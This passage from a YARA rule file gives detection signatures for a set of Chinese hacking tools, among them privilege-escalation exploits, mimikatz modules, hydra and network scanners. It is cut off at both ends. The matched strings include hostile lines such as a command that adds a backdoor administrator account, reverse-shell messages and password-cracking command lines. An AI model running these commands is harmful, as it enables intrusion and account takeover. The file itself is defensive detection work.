		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "be407bd5bf5bcd51d38d1308e17a1731cd52f66b"
	strings:
		$s1 = "<description>IEBars</description>" fullword ascii
		$s2 = "PECompact2" fullword ascii
		$s3 = "Radmin, Remote Administrator" fullword wide
		$s4 = "Radmin 3.0 Hash " fullword wide
		$s5 = "HASH1.0" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 600KB and all of them
}

rule OSEditor {
	meta:
		description = "Chinese Hacktool Set - file OSEditor.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "6773c3c6575cf9cfedbb772f3476bb999d09403d"
	strings:
		$s1 = "OSEditor.exe" fullword wide
		$s2 = "netsafe" wide
		$s3 = "OSC Editor" fullword wide
		$s4 = "GIF89" ascii
		$s5 = "Unlock" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule GoodToolset_ms11011 {
	meta:
		description = "Chinese Hacktool Set - file ms11011.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5ad7a4962acbb6b0e3b73d77385eb91feb88b386"
	strings:
		$s0 = "\\i386\\Hello.pdb" ascii
		$s1 = "OS not supported." fullword ascii
		$s3 = "Not supported." fullword wide  /* Goodware String - occured 3 times */
		$s4 = "SystemDefaultEUDCFont" fullword wide  /* Goodware String - occured 18 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule FreeVersion_release {
	meta:
		description = "Chinese Hacktool Set - file release.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "f42e4b5748e92f7a450eb49fc89d6859f4afcebb"
	strings:
		$s1 = "-->Got WMI process Pid: %d " ascii
		$s2 = "This exploit will execute \"net user " ascii
		$s3 = "net user temp 123456 /add & net localgroup administrators temp /add" fullword ascii
		$s4 = "Running reverse shell" ascii
		$s5 = "wmiprvse.exe" fullword ascii
		$s6 = "SELECT * FROM IIsWebInfo" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 3 of them
}

rule churrasco {
	meta:
		description = "Chinese Hacktool Set - file churrasco.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "a8d4c177948a8e60d63de9d0ed948c50d0151364"
	strings:
		$s1 = "Done, command should have ran as SYSTEM!" ascii
		$s2 = "Running command with SYSTEM Token..." ascii
		$s3 = "Thread impersonating, got NETWORK SERVICE Token: 0x%x" ascii
		$s4 = "Found SYSTEM token 0x%x" ascii
		$s5 = "Thread not impersonating, looking for another thread..." ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and 2 of them
}
rule x64_KiwiCmd {
	meta:
		description = "Chinese Hacktool Set - file KiwiCmd.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "569ca4ff1a5ea537aefac4a04a2c588c566c6d86"
	strings:
		$s1 = "Process Ok, Memory Ok, resuming process :)" fullword wide
		$s2 = "Kiwi Cmd no-gpo" fullword wide
		$s3 = "KiwiAndCMD" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and 2 of them
}

rule sql1433_SQL {
	meta:
		description = "Chinese Hacktool Set - file SQL.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "025e87deadd1c50b1021c26cb67b76b476fafd64"
	strings:
		/* WIDE: ProductName 1433 */
		$s0 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 31 00 34 00 33 00 33 }
		/* WIDE: ProductVersion 1,4,3,3 */
		$s1 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2C 00 34 00 2C 00 33 00 2C 00 33 }
	condition:
		uint16(0) == 0x5a4d and filesize < 90KB and all of them
}

rule CookieTools2 {
	meta:
		description = "Chinese Hacktool Set - file CookieTools2.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "cb67797f229fdb92360319e01277e1345305eb82"
	strings:
		$s1 = "www.gxgl.com&www.gxgl.net" fullword wide
		$s2 = "ip.asp?IP=" fullword ascii
		$s3 = "MSIE 5.5;" fullword ascii
		$s4 = "SOFTWARE\\Borland\\" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and all of them
}

rule cyclotron {
	meta:
		description = "Chinese Hacktool Set - file cyclotron.sys"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5b63473b6dc1e5942bf07c52c31ba28f2702b246"
	strings:
		$s1 = "\\Device\\IDTProt" fullword wide
		$s2 = "IoDeleteSymbolicLink" fullword ascii  /* Goodware String - occured 467 times */
		$s3 = "\\??\\slIDTProt" fullword wide
		$s4 = "IoDeleteDevice" fullword ascii  /* Goodware String - occured 993 times */
		$s5 = "IoCreateSymbolicLink" fullword ascii /* Goodware String - occured 467 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 3KB and all of them
}

rule xscan_gui {
	meta:
		description = "Chinese Hacktool Set - file xscan_gui.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "a9e900510396192eb2ba4fb7b0ef786513f9b5ab"
	strings:
		$s1 = "%s -mutex %s -host %s -index %d -config \"%s\"" fullword ascii
		$s2 = "www.target.com" fullword ascii
		$s3 = "%s\\scripts\\desc\\%s.desc" fullword ascii
		$s4 = "%c Active/Maximum host thread: %d/%d, Current/Maximum thread: %d/%d, Time(s): %l" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule CN_Tools_hscan {
	meta:
		description = "Chinese Hacktool Set - file hscan.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "17a743e40790985ececf5c66eaad2a1f8c4cffe8"
	strings:
		$s1 = "%s -f hosts.txt -port -ipc -pop -max 300,20 -time 10000" fullword ascii
		$s2 = "%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,20" fullword ascii
		$s3 = "%s -h www.target.com -all" fullword ascii
		$s4 = ".\\report\\%s-%s.html" fullword ascii
		$s5 = ".\\log\\Hscan.log" fullword ascii
		$s6 = "[%s]: Found cisco Enable password: %s !!!" fullword ascii
		$s7 = "%s@ftpscan#FTP Account:  %s/[null]" fullword ascii
		$s8 = ".\\conf\\mysql_pass.dic" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule GoodToolset_pr {
	meta:
		description = "Chinese Hacktool Set - file pr.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "f6676daf3292cff59ef15ed109c2d408369e8ac8"
	strings:
		$s1 = "-->Got WMI process Pid: %d " ascii
		$s2 = "-->This exploit gives you a Local System shell " ascii
		$s3 = "wmiprvse.exe" fullword ascii
		$s4 = "Try the first %d time" fullword ascii
		$s5 = "-->Build&&Change By p " ascii
		$s6 = "root\\MicrosoftIISv2" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule hydra_7_4_1_hydra {
	meta:
		description = "Chinese Hacktool Set - file hydra.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "3411d0380a1c1ebf58a454765f94d4f1dd714b5b"
	strings:
		$s1 = "%d of %d target%s%scompleted, %lu valid password%s found" fullword ascii
		$s2 = "[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD" fullword ascii
		$s3 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii
		$s4 = "[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED" fullword ascii
		$s5 = "[ERROR] SMTP LOGIN AUTH, either this auth is disabled" fullword ascii
		$s6 = "\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\"" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them
}

rule CN_Tools_srss_2 {
	meta:
		description = "Chinese Hacktool Set - file srss.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "c418b30d004051bbf1b2d3be426936b95b5fea6f"
	strings:
		$x1 = "used pepack!" fullword ascii

		$s1 = "KERNEL32.dll" fullword ascii
		$s2 = "KERNEL32.DLL" fullword ascii
		$s3 = "LoadLibraryA" fullword ascii
		$s4 = "GetProcAddress" fullword ascii
		$s5 = "VirtualProtect" fullword ascii
		$s6 = "VirtualAlloc" fullword ascii
		$s7 = "VirtualFree" fullword ascii
		$s8 = "ExitProcess" fullword ascii
	condition:
		uint16(0) == 0x5a4d and ( $x1 at 0 ) and filesize < 14KB and all of ($s*)
}

rule Dos_NtGod {
	meta:
		description = "Chinese Hacktool Set - file NtGod.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "adefd901d6bbd8437116f0170b9c28a76d4a87bf"
	strings:
		$s0 = "\\temp\\NtGodMode.exe" ascii
		$s4 = "NtGodMode.exe" fullword ascii
		$s10 = "ntgod.bat" fullword ascii
		$s19 = "sfxcmd" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and all of them
}

rule CN_Tools_VNCLink {
	meta:
		description = "Chinese Hacktool Set - file VNCLink.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "cafb531822cbc0cfebbea864489eebba48081aa1"
	strings:
		$s1 = "C:\\temp\\vncviewer4.log" fullword ascii
		$s2 = "[BL4CK] Patched by redsand || http://blacksecurity.org" fullword ascii
		$s3 = "fake release extendedVkey 0x%x, keysym 0x%x" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 580KB and 2 of them
}

rule tools_NTCmd {
	meta:
		description = "Chinese Hacktool Set - file NTCmd.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "a3ae8659b9a673aa346a60844208b371f7c05e3c"
	strings:
		$s1 = "pipecmd \\\\%s -U:%s -P:\"\" %s" fullword ascii
		$s2 = "[Usage]:  %s <HostName|IP> <Username> <Password>" fullword ascii
		$s3 = "pipecmd \\\\%s -U:%s -P:%s %s" fullword ascii
		$s4 = "============By uhhuhy (Feb 18,2003) - http://www.cnhonker.net============" fullword ascii /* PEStudio Blacklist: os */
		$s5 = "=======================NTcmd v0.11 for HScan v1.20=======================" fullword ascii
		$s6 = "NTcmd>" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 80KB and 2 of them
}

rule mysql_pwd_crack {
	meta:
		description = "Chinese Hacktool Set - file mysql_pwd_crack.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "57d1cb4d404688804a8c3755b464a6e6248d1c73"
	strings:
		$s1 = "mysql_pwd_crack 127.0.0.1 -x 3306 -p root -d userdict.txt" fullword ascii
		$s2 = "Successfully --> username %s password %s " fullword ascii
		$s3 = "zhouzhen@gmail.com http://zhouzhen.eviloctal.org" fullword ascii
		$s4 = "-a automode  automatic crack the mysql password " fullword ascii
		$s5 = "mysql_pwd_crack 127.0.0.1 -x 3306 -a" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 1 of them
}

rule CmdShell64 {
	meta:
		description = "Chinese Hacktool Set - file CmdShell64.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5b92510475d95ae5e7cd6ec4c89852e8af34acf1"
	strings:
		$s1 = "C:\\Windows\\System32\\JAVASYS.EXE" fullword wide
		$s2 = "ServiceCmdShell" fullword ascii
		$s3 = "<!-- If your application is designed to work with Windows 8.1, uncomment the fol" ascii
		$s4 = "ServiceSystemShell" fullword wide
		$s5 = "[Root@CmdShell ~]#" fullword wide
		$s6 = "Hello Man 2015 !" fullword wide
		$s7 = "CmdShell" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 30KB and 4 of them
}

rule Ms_Viru_v {
	meta:
		description = "Chinese Hacktool Set - file v.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ecf4ba6d1344f2f3114d52859addee8b0770ed0d"
	strings:
		$s1 = "c:\\windows\\system32\\command.com /c " fullword ascii
		$s2 = "Easy Usage Version -- Edited By: racle@tian6.com" fullword ascii
		$s3 = "OH,Sry.Too long command." fullword ascii
		$s4 = "Success! Commander." fullword ascii
		$s5 = "Hey,how can racle work without ur command ?" fullword ascii
		$s6 = "The exploit thread was unable to map the virtual 8086 address space" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 3 of them
}

rule CN_Tools_Vscan {
	meta:
		description = "Chinese Hacktool Set - file Vscan.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "0365fe05e2de0f327dfaa8cd0d988dbb7b379612"
	strings:
		$s1 = "[+] Usage: VNC_bypauth <target> <scantype> <option>" fullword ascii
		$s2 = "========RealVNC <= 4.1.1 Bypass Authentication Scanner=======" fullword ascii
		$s3 = "[+] Type VNC_bypauth <target>,<scantype> or <option> for more informations" fullword ascii
		$s4 = "VNC_bypauth -i 192.168.0.1,192.168.0.2,192.168.0.3,..." fullword ascii
		$s5 = "-vn:%-15s:%-7d  connection closed" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 60KB and 2 of them
}

rule Dos_iis {
	meta:
		description = "Chinese Hacktool Set - file iis.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "61ffd2cbec5462766c6f1c44bd44eeaed4f3d2c7"
	strings:
		$s1 = "comspec" fullword ascii
		$s2 = "program terming" fullword ascii
		$s3 = "WinSta0\\Defau" fullword ascii
		$s4 = "* FROM IIsWebInfo" ascii
		$s5 = "www.icehack." ascii
		$s6 = "wmiprvse.exe" fullword ascii
		$s7 = "Pid: %d" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 70KB and all of them
}

rule IISPutScannesr {
	meta:
		description = "Chinese Hacktool Set - file IISPutScannesr.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "2dd8fee20df47fd4eed5a354817ce837752f6ae9"
	strings:
		$s1 = "yoda & M.o.D." ascii
		$s2 = "-> come.to/f2f **************" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and all of them
}

rule Generate {
	meta:
		description = "Chinese Hacktool Set - file Generate.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "2cb4c3916271868c30c7b4598da697f59e9c7a12"
	strings:
		$s1 = "C:\\TEMP\\" fullword ascii
		$s2 = "Connection Closed Gracefully.;Could not bind socket. Address and port are alread" wide
		$s3 = "$530 Please login with USER and PASS." fullword ascii
		$s4 = "_Shell.exe" fullword ascii
		$s5 = "ftpcWaitingPassword" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and 3 of them
}

rule Pc_rejoice {
	meta:
		description = "Chinese Hacktool Set - file rejoice.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372"
	strings:
		$s1 = "@members.3322.net/dyndns/update?system=dyndns&hostname=" fullword ascii
		$s2 = "http://www.xxx.com/xxx.exe" fullword ascii
		$s3 = "@ddns.oray.com/ph/update?hostname=" fullword ascii
		$s4 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
		$s5 = "ListViewProcessListColumnClick!" fullword ascii
		$s6 = "http://iframe.ip138.com/ic.asp" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and 3 of them
}

rule ms11080_withcmd {
	meta:
		description = "Chinese Hacktool Set - file ms11080_withcmd.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "745e5058acff27b09cfd6169caf6e45097881a49"
	strings:
		$s1 = "Usage : ms11-080.exe cmd.exe Command " fullword ascii
		$s2 = "\\ms11080\\ms11080\\Debug\\ms11080.pdb" fullword ascii
		$s3 = "[>] by:Mer4en7y@90sec.org" fullword ascii
		$s4 = "[>] create porcess error" fullword ascii
		$s5 = "[>] ms11-080 Exploit" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and 1 of them
}

rule OtherTools_xiaoa {
	meta:
		description = "Chinese Hacktool Set - file xiaoa.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "6988acb738e78d582e3614f83993628cf92ae26d"
	strings:
		$s1 = "Usage:system_exp.exe \"cmd\"" fullword ascii
		$s2 = "The shell \"cmd\" success!" fullword ascii
		$s3 = "Not Windows NT family OS." fullword ascii /* PEStudio Blacklist: os */
		$s4 = "Unable to get kernel base address." fullword ascii
		$s5 = "run \"%s\" failed,code: %d" fullword ascii
		$s6 = "Windows Kernel Local Privilege Exploit " fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule unknown2 {
	meta:
		description = "Chinese Hacktool Set - file unknown2.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "32508d75c3d95e045ddc82cb829281a288bd5aa3"
	strings:
		$s1 = "http://md5.com.cn/index.php/md5reverse/index/md/" fullword wide
		$s2 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
		$s3 = "http://www.md5.com.cn" fullword wide
		$s4 = "1.5.exe" fullword wide
		$s5 = "\\Set.ini" fullword wide
		$s6 = "OpenFileDialog1" fullword wide
		$s7 = " (*.txt)|*.txt" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and 4 of them
}

rule hydra_7_3_hydra {
	meta:
		description = "Chinese Hacktool Set - file hydra.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "2f82b8bf1159e43427880d70bcd116dc9e8026ad"
	strings:
		$s1 = "[ATTEMPT-ERROR] target %s - login \"%s\" - pass \"%s\" - child %d - %lu of %lu" fullword ascii
		$s2 = "(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE" ascii
		$s3 = "cn=^USER^,cn=users,dc=foo,dc=bar,dc=com for domain foo.bar.com" fullword ascii
		$s4 = "[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD" fullword ascii
		$s5 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and 1 of them
}

rule OracleScan {
	meta:
		description = "Chinese Hacktool Set - file OracleScan.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "10ff7faf72fe6da8f05526367b3522a2408999ec"
	strings:
		$s1 = "MYBLOG:HTTP://HI.BAIDU.COM/0X24Q" fullword ascii
		$s2 = "\\Borland\\Delphi\\RTL" fullword ascii
		$s3 = "USER_NAME" ascii
		$s4 = "FROMWWHERE" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule SQLTools {
	meta:
		description = "Chinese Hacktool Set - file SQLTools.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "38a9caa2079afa2c8d7327e7762f7ed9a69056f7"
	strings:
		$s1 = "DBN_POST" fullword wide
		$s2 = "LOADER ERROR" fullword ascii
		$s3 = "www.1285.net" fullword wide
		$s4 = "TUPFILEFORM" fullword wide
		$s5 = "DBN_DELETE" fullword wide
		$s6 = "DBINSERT" fullword wide
		$s7 = "Copyright (C) Kibosoft Corp. 2001-2006" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 2350KB and all of them
}

rule portscanner {
	meta:
		description = "Chinese Hacktool Set - file portscanner.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "1de367d503fdaaeee30e8ad7c100dd1e320858a4"
	strings:
		$s0 = "PortListfNo" fullword ascii
		$s1 = ".533.net" fullword ascii
		$s2 = "CRTDLL.DLL" fullword ascii
		$s3 = "exitfc" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 25KB and all of them
}

rule kappfree {
	meta:
		description = "Chinese Hacktool Set - file kappfree.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e57e79f190f8a24ca911e6c7e008743480c08553"
	strings:
		$s1 = "Bienvenue dans un processus distant" fullword wide
		$s2 = "kappfree.dll" fullword ascii
		$s3 = "kappfree de mimikatz pour Windows (anti AppLocker)" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule Smartniff {
	meta:
		description = "Chinese Hacktool Set - file Smartniff.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "67609f21d54a57955d8fe6d48bc471f328748d0a"
	strings:
		$s1 = "smsniff.exe" fullword wide
		$s2 = "support@nirsoft.net0" fullword ascii
		$s3 = "</requestedPrivileges></security></trustInfo></assembly>" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule ChinaChopper_caidao {
	meta:
		description = "Chinese Hacktool Set - file caidao.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "056a60ec1f6a8959bfc43254d97527b003ae5edb"
	strings:
		$s1 = "Pass,Config,n{)" fullword ascii
		$s2 = "phMYSQLZ" fullword ascii
		$s3 = "\\DHLP\\." fullword ascii
		$s4 = "\\dhlp\\." fullword ascii
		$s5 = "SHAutoComple" fullword ascii
		$s6 = "MainFrame" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1077KB and all of them
}

rule KiwiTaskmgr_2 {
	meta:
		description = "Chinese Hacktool Set - file KiwiTaskmgr.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16"
	strings:
		$s1 = "Process Ok, Memory Ok, resuming process :)" fullword wide
		$s2 = "Kiwi Taskmgr no-gpo" fullword wide
		$s3 = "KiwiAndTaskMgr" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule kappfree_2 {
	meta:
		description = "Chinese Hacktool Set - file kappfree.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5d578df9a71670aa832d1cd63379e6162564fb6b"
	strings:
		$s1 = "kappfree.dll" fullword ascii
		$s2 = "kappfree de mimikatz pour Windows (anti AppLocker)" fullword wide
		$s3 = "' introuvable !" fullword wide
		$s4 = "kiwi\\mimikatz" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}

rule x_way2_5_sqlcmd {
	meta:
		description = "Chinese Hacktool Set - file sqlcmd.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5152a57e3638418b0d97a42db1c0fc2f893a2794"
	strings:
		$s1 = "LOADER ERROR" fullword ascii
		$s2 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s3 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
		$s4 = "kernel32.dll" fullword ascii
		$s5 = "VirtualAlloc" fullword ascii
		$s6 = "VirtualFree" fullword ascii
		$s7 = "VirtualProtect" fullword ascii
		$s8 = "ExitProcess" fullword ascii
		$s9 = "user32.dll" fullword ascii
		$s10 = "MessageBoxA" fullword ascii
		$s12 = "wsprintfA" fullword ascii
		$s13 = "kernel32.dll" fullword ascii
		$s14 = "GetProcAddress" fullword ascii
		$s15 = "GetModuleHandleA" fullword ascii
		$s16 = "LoadLibraryA" fullword ascii
		$s17 = "odbc32.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them
}

rule Win32_klock {
	meta:
		description = "Chinese Hacktool Set - file klock.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "7addce4434670927c4efaa560524680ba2871d17"
	strings:
		$s1 = "klock.dll" fullword ascii
		$s2 = "Erreur : impossible de basculer le bureau ; SwitchDesktop : " fullword wide
		$s3 = "klock de mimikatz pour Windows" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and all of them
}

rule ipsearcher {
	meta:
		description = "Chinese Hacktool Set - file ipsearcher.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "1e96e9c5c56fcbea94d26ce0b3f1548b224a4791"
	strings:
		$s0 = "http://www.wzpg.com" fullword ascii
		$s1 = "ipsearcher\\ipsearcher\\Release\\ipsearcher.pdb" fullword ascii
		$s3 = "_GetAddress" fullword ascii
		$s5 = "ipsearcher.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 140KB and all of them
}

rule ms10048_x64 {
	meta:
		description = "Chinese Hacktool Set - file ms10048-x64.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "418bec3493c85e3490e400ecaff5a7760c17a0d0"
	strings:
		$s1 = "The target is most likely patched." fullword ascii
		$s2 = "Dojibiron by Ronald Huizer, (c) master#h4cker.us  " fullword ascii
		$s3 = "[ ] Creating evil window" fullword ascii
		$s4 = "[+] Set to %d exploit half succeeded" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 40KB and 1 of them
}

rule hscangui {
	meta:
		description = "Chinese Hacktool Set - file hscangui.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "af8aced0a78e1181f4c307c78402481a589f8d07"
	strings:
		$s1 = "[%s]: Found \"FTP account: anyone/anyone@any.net\"  !!!" fullword ascii
		$s2 = "http://www.cnhonker.com" fullword ascii
		$s3 = "%s@ftpscan#Cracked account:  %s/%s" fullword ascii
		$s4 = "[%s]: Found \"FTP account: %s/%s\" !!!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 220KB and 2 of them
}

rule GoodToolset_ms11080 {
	meta:
		description = "Chinese Hacktool Set - file ms11080.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "f0854c49eddf807f3a7381d3b20f9af4a3024e9f"
	strings:
		$s1 = "[*] command add user 90sec 90sec" fullword ascii
		$s2 = "\\ms11080\\Debug\\ms11080.pdb" fullword ascii
		$s3 = "[>] by:Mer4en7y@90sec.org" fullword ascii
		$s4 = "[*] Add to Administrators success" fullword ascii
		$s5 = "[*] User has been successfully added" fullword ascii
		$s6 = "[>] ms11-08 Exploit" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 240KB and 2 of them
}

rule epathobj_exp64 {
	meta:
		description = "Chinese Hacktool Set - file epathobj_exp64.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "09195ba4e25ccce35c188657957c0f2c6a61d083"
	strings:
		$s1 = "Watchdog thread %d waiting on Mutex" fullword ascii
		$s2 = "Exploit ok run command" fullword ascii
		$s3 = "\\epathobj_exp\\x64\\Release\\epathobj_exp.pdb" fullword ascii
		$s4 = "Alllocated userspace PATHRECORD () %p" fullword ascii
		$s5 = "Mutex object did not timeout, list not patched" fullword ascii
		$s6 = "- inconsistent onexit begin-end variables" fullword wide  /* Goodware String - occured 96 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and 2 of them
}

rule kelloworld_2 {
	meta:
		description = "Chinese Hacktool Set - file kelloworld.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
	strings:
		$s1 = "Hello World!" fullword wide
		$s2 = "kelloworld.dll" fullword ascii
		$s3 = "kelloworld de mimikatz pour Windows" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule HScan_v1_20_hscan {
	meta:
		description = "Chinese Hacktool Set - file hscan.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "568b06696ea0270ee1a744a5ac16418c8dacde1c"
	strings:
		$s1 = "[%s]: Found \"FTP account: anyone/anyone@any.net\"  !!!" fullword ascii
		$s2 = "%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100" fullword ascii
		$s3 = ".\\report\\%s-%s.html" fullword ascii
		$s4 = ".\\log\\Hscan.log" fullword ascii
		$s5 = "[%s]: Found cisco Enable password: %s !!!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}

rule _Project1_Generate_rejoice {
	meta:
